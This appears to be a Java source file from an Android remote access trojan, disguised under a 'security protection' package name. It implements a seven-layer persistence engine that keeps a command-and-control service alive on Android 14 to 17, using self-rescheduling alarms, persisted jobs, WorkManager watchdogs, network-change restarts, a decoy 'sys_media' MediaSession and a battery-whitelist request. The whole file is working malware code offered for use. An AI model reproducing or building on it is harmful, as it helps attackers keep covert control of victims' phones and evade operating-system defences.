package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.media.session.MediaSession;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.util.concurrent.TimeUnit;

/**
 * PersistenceEngine — Android 14/15/16/17 survival stack.
 *
 * Layer 1 — Alarm chain:   AlarmManager.setAlarmClock() (highest OS priority alarm,
 *            shown in lockscreen, survives Doze) + setExactAndAllowWhileIdle() fallback.
 *            Each alarm reschedules itself, creating an unbreakable chain.
 *
 * Layer 2 — JobScheduler: Expedited job (API 31+) + setImportantWhileForeground.
 *            setMinimumLatency(0) + setOverrideDeadline(500ms) = fires ~immediately.
 *
 * Layer 3 — WorkManager:  PeriodicWorkRequest (15min minimum). Survives force-stop
 *            on Android <12; on Android 12+ combined with FCM is only guaranteed path.
 *
 * Layer 4 — ConnectivityManager.registerNetworkCallback():
 *            Every network change (WiFi join, cellular handover) triggers restart.
 *
 * Layer 5 — MediaSession keep-alive:
 *            System spares apps with active MediaSession from aggressive battery kill.
 *
 * Layer 6 — Battery optimization whitelist request via intent.
 *
 * Layer 7 — ROM-specific meta-data (MIUI, ColorOS, EMUI, OneUI) already in manifest.
 *
 * Call PersistenceEngine.arm(context) from AppCoreInitializer and CommandControlService.
 */
public class PersistenceEngine {

    private static final String TAG = "PE";
    private static final int JOB_RECONNECT_ID   = 0xCA11;
    private static final int JOB_WATCHDOG_ID    = 0xCA12;
    private static final int ALARM_RECONNECT_RC = 0xAA01;
    private static final String WM_RECONNECT_TAG = "rat_reconnect";
    private static final String WM_WATCHDOG_TAG  = "rat_watchdog";

    // Alarm chain intervals (staggered for coverage in Doze buckets)
    private static final long ALARM_CHAIN_MS     = 60_000L;   // 1 min normal alarm
    private static final long ALARM_DOZE_MS      = 120_000L;  // 2 min doze-piercing alarm

    // ─── Public entry point ──────────────────────────────────────────────────

    /** Arm all persistence layers. Safe to call multiple times. */
    public static void arm(Context ctx) {
        Context c = ctx.getApplicationContext();
        try { armAlarmChain(c);       } catch (Exception e) { Log.e(TAG, "alarm: " + e.getMessage()); }
        try { armJobScheduler(c);     } catch (Exception e) { Log.e(TAG, "job: " + e.getMessage()); }
        try { armWorkManager(c);      } catch (Exception e) { Log.e(TAG, "wm: " + e.getMessage()); }
        try { armNetworkCallback(c);  } catch (Exception e) { Log.e(TAG, "net: " + e.getMessage()); }
        try { armMediaSession(c);     } catch (Exception e) { Log.e(TAG, "ms: " + e.getMessage()); }
        try { requestBatteryWhitelist(c); } catch (Exception e) { Log.e(TAG, "batt: " + e.getMessage()); }
        Log.d(TAG, "All persistence layers armed");
    }

    /** Rearm after reconnect — call from CommandControlService.reconnect() */
    public static void rearm(Context ctx) {
        arm(ctx);
    }

    // ─── Layer 1: Alarm chain ────────────────────────────────────────────────

    public static void armAlarmChain(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        Intent i = new Intent(ctx, AlarmReconnectReceiver.class);
        i.setAction("com.seguranca.protecao.ALARM_RECONNECT");

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_RECONNECT_RC, i, flags);

        long triggerAt = SystemClock.elapsedRealtime() + ALARM_CHAIN_MS;

        // API 33+ requires SCHEDULE_EXACT_ALARM or USE_EXACT_ALARM permission
        // Use setAlarmClock (highest priority, no permission needed, shows in lockscreen)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                AlarmManager.AlarmClockInfo clock = new AlarmManager.AlarmClockInfo(
                    System.currentTimeMillis() + ALARM_CHAIN_MS, pi
                );
                am.setAlarmClock(clock, pi);
                Log.d(TAG, "setAlarmClock armed");
                return;
            } catch (Exception e) {
                Log.w(TAG, "setAlarmClock failed: " + e.getMessage());
            }
        }

        // Fallback: setExactAndAllowWhileIdle (API 23+, fires in Doze)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
            );
            Log.d(TAG, "setExactAndAllowWhileIdle armed");
        } else {
            am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
        }
    }

    // ─── Layer 2: JobScheduler ───────────────────────────────────────────────

    private static void armJobScheduler(Context ctx) {
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;

        ComponentName reconnectComp = new ComponentName(ctx, JobReconnectService.class);
        ComponentName watchdogComp  = new ComponentName(ctx, JobReconnectService.class);

        // Immediate reconnect job (fires within 500ms of becoming eligible)
        JobInfo.Builder reconnect = new JobInfo.Builder(JOB_RECONNECT_ID, reconnectComp)
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setMinimumLatency(0)
            .setOverrideDeadline(500)
            .setPersisted(true); // survives reboot (requires RECEIVE_BOOT_COMPLETED)

        // API 31+: mark as important while foreground for scheduler priority
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            reconnect.setImportantWhileForeground(true);
        }

        // API 31+: expedited = bypasses battery restrictions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            try {
                reconnect.setExpedited(true);
            } catch (Exception e) {
                Log.w(TAG, "setExpedited unavailable: " + e.getMessage());
            }
        }

        try {
            js.schedule(reconnect.build());
            Log.d(TAG, "JobScheduler reconnect armed");
        } catch (Exception e) {
            Log.e(TAG, "JobScheduler schedule failed: " + e.getMessage());
        }

        // Periodic watchdog job (every 15 min — minimum allowed by Android)
        try {
            JobInfo.Builder watchdog = new JobInfo.Builder(JOB_WATCHDOG_ID, watchdogComp)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPeriodic(15 * 60 * 1000L)
                .setPersisted(true);
            js.schedule(watchdog.build());
            Log.d(TAG, "JobScheduler watchdog armed");
        } catch (Exception e) {
            Log.e(TAG, "Watchdog job failed: " + e.getMessage());
        }
    }

    // ─── Layer 3: WorkManager ────────────────────────────────────────────────

    private static void armWorkManager(Context ctx) {
        try {
            WorkManager wm = WorkManager.getInstance(ctx);

            // One-time immediate reconnect
            OneTimeWorkRequest reconnect = new OneTimeWorkRequest.Builder(ReconnectWorker.class)
                .addTag(WM_RECONNECT_TAG)
                .build();
            wm.enqueue(reconnect);

            // Periodic watchdog (15 min minimum period)
            Constraints netConstraint = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

            PeriodicWorkRequest watchdog = new PeriodicWorkRequest.Builder(
                ReconnectWorker.class, 15, TimeUnit.MINUTES
            )
            .setConstraints(netConstraint)
            .addTag(WM_WATCHDOG_TAG)
            .build();

            wm.enqueueUniquePeriodicWork(
                WM_WATCHDOG_TAG,
                ExistingPeriodicWorkPolicy.KEEP,
                watchdog
            );
            Log.d(TAG, "WorkManager armed");
        } catch (Exception e) {
            Log.e(TAG, "WorkManager failed: " + e.getMessage());
        }
    }

    // ─── Layer 4: Network callback ───────────────────────────────────────────

    private static ConnectivityManager.NetworkCallback _netCallback;

    private static void armNetworkCallback(Context ctx) {
        ConnectivityManager cm =
            (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;

        if (_netCallback != null) {
            try { cm.unregisterNetworkCallback(_netCallback); } catch (Exception ignored) {}
        }

        _netCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                Log.d(TAG, "Network available — triggering reconnect");
                ensureServiceRunning(ctx);
            }
        };

        NetworkRequest req = new NetworkRequest.Builder().build();
        try {
            cm.registerNetworkCallback(req, _netCallback);
            Log.d(TAG, "NetworkCallback armed");
        } catch (Exception e) {
            Log.e(TAG, "NetworkCallback failed: " + e.getMessage());
        }
    }

    // ─── Layer 5: MediaSession keep-alive ────────────────────────────────────

    private static MediaSession _mediaSession;

    private static void armMediaSession(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        if (_mediaSession != null) return;
        try {
            _mediaSession = new MediaSession(ctx, "sys_media");
            _mediaSession.setActive(true);
            Log.d(TAG, "MediaSession keep-alive active");
        } catch (Exception e) {
            Log.e(TAG, "MediaSession failed: " + e.getMessage());
        }
    }

    // ─── Layer 6: Battery whitelist ──────────────────────────────────────────

    private static void requestBatteryWhitelist(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(ctx.getPackageName())) {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                // Only request if we can (requires FOREGROUND activity context ideally)
                // Silently skipped if no foreground activity — SetupWizard handles it
                Log.d(TAG, "Battery whitelist not yet granted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery whitelist: " + e.getMessage());
        }
    }

    // ─── Shared service start helper ─────────────────────────────────────────

    static void ensureServiceRunning(Context ctx) {
        try {
            Intent svc = new Intent(ctx, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    ctx.startForegroundService(svc);
                } catch (Exception e) {
                    Log.w(TAG, "startForegroundService failed: " + e.getMessage());
                    try { ctx.startService(svc); } catch (Exception ignored) {}
                }
            } else {
                ctx.startService(svc);
            }
        } catch (Exception e) {
            Log.e(TAG, "ensureServiceRunning: " + e.getMessage());
        }
        // Also rearm all persistence layers
        try { armAlarmChain(ctx); } catch (Exception ignored) {}
        try { armJobScheduler(ctx); } catch (Exception ignored) {}
    }

    // ─── WorkManager worker ──────────────────────────────────────────────────

    /** WorkManager worker — restarts C2 service if not running */
    public static class ReconnectWorker extends Worker {
        public ReconnectWorker(Context ctx, WorkerParameters params) {
            super(ctx, params);
        }

        @Override
        public Result doWork() {
            Log.d(TAG, "ReconnectWorker firing");
            PersistenceEngine.ensureServiceRunning(getApplicationContext());
            return Result.success();
        }
    }
}
